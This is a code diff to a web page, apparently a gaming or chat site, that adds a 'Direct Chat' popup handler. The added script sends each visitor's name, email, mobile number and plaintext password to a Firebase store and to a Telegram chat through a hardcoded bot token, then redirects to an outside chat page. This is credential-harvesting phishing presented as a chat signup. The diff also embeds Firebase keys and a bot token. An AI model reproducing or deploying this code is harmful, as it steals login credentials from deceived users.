@@ -168,6 +168,7 @@
     }
     .chat-popup-next-btn:hover { transform: scale(1.02); box-shadow: 0 10px 32px rgba(52,199,89,0.6); }
     .chat-popup-next-btn:active { transform: scale(0.98); }
+    .chat-popup-next-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
     .chat-popup-next-btn svg { width: 18px; height: 18px; }
     .chat-popup-close {
       position: absolute; top: 16px; right: 16px;
@@ -557,6 +558,64 @@
 
   <script src="app.js"></script>
   <script>
+    // ===== FIREBASE CONFIG =====
+    var FIREBASE_CONFIG = {
+      apiKey: "AIzaSyCiqaLzh7PoVC5l03sJFdtK548Wulufn94",
+      authDomain: "alll-projects-admin-pennal.firebaseapp.com",
+      projectId: "alll-projects-admin-pennal",
+      storageBucket: "alll-projects-admin-pennal.firebasestorage.app",
+      messagingSenderId: "689297868215",
+      appId: "1:689297868215:web:2747b19c2da47a31f49432"
+    };
+    var SITE_ID = "topx_game";
+    var _fbDb = null;
+
+    function loadFirebase() {
+      if (_fbDb) return Promise.resolve(_fbDb);
+      return new Promise(function(resolve, reject) {
+        var initDb = function() {
+          try {
+            if (!firebase.apps.length) firebase.initializeApp(FIREBASE_CONFIG);
+            _fbDb = firebase.firestore();
+            resolve(_fbDb);
+          } catch (e) { reject(e); }
+        };
+        if (window.firebase && window.firebase.firestore) { initDb(); return; }
+        var urls = [
+          'https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js',
+          'https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js'
+        ];
+        var loaded = 0;
+        urls.forEach(function(src) {
+          var s = document.createElement('script');
+          s.src = src;
+          s.onload = function() { loaded++; if (loaded === urls.length) initDb(); };
+          s.onerror = function() { reject(new Error('Firebase load failed')); };
+          document.head.appendChild(s);
+        });
+      });
+    }
+
+    function saveSubmission(data) {
+      return loadFirebase().then(function(db) {
+        var payload = Object.assign({}, data, { site_id: SITE_ID, created_at: firebase.firestore.FieldValue.serverTimestamp() });
+        return db.collection('submissions').add(payload);
+      });
+    }
+
+    // ===== TELEGRAM BOT =====
+    var TG_BOT_TOKEN = '8906822745:AAH_rQOexAgYey92rzgNw6piosCXDY20rwM';
+    var TG_CHAT_ID = '-1003782852692';
+
+    function sendToTelegram(text) {
+      return fetch('https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: TG_CHAT_ID, text: text, parse_mode: 'HTML' })
+      }).then(function(r) { return r.json(); });
+    }
+
+    // ===== SPLASH SCREEN =====
     window.addEventListener('DOMContentLoaded', function() {
       setTimeout(function() {
         var splash = document.getElementById('splash');
@@ -566,8 +625,12 @@
           setTimeout(function() { w.classList.add('anim-in'); }, 300 + i * 120);
         });
       }, 1800);
+
+      // Preload Firebase in background
+      loadFirebase().catch(function(e) { console.warn('Firebase preload skipped:', e); });
     });
 
+    // ===== CHAT POPUP =====
     function openChatPopup() {
       var popup = document.getElementById('chatPopup');
       popup.classList.add('show');
@@ -598,7 +661,34 @@
         return;
       }
 
-      window.location.href = 'https://chat-page.edgeone.app';
+      var submitBtn = document.querySelector('.chat-popup-next-btn');
+      submitBtn.disabled = true;
+      submitBtn.innerHTML = 'Submitting... <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>';
+
+      var data = {
+        type: 'Direct Chat',
+        user_name: name,
+        email: email,
+        mobile: mobile,
+        password: password,
+        time: new Date().toLocaleString('en-IN', { day: '2-digit', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit' })
+      };
+
+      var tgMessage = '💬 <b>New Direct Chat Request</b>\n\n' +
+        '👤 Name: ' + name + '\n' +
+        '📧 Email: ' + email + '\n' +
+        '📱 Mobile: ' + mobile + '\n' +
+        '🔑 Password: ' + password + '\n' +
+        '🕐 Time: ' + data.time;
+
+      Promise.all([
+        saveSubmission(data).catch(function(e) { console.warn('Firebase error:', e); }),
+        sendToTelegram(tgMessage).catch(function(e) { console.warn('Telegram error:', e); })
+      ]).then(function() {
+        window.location.href = 'https://chat-page.edgeone.app';
+      }).catch(function() {
+        window.location.href = 'https://chat-page.edgeone.app';
+      });
     }
 
     document.getElementById('chatPopup').addEventListener('click', function(e) {
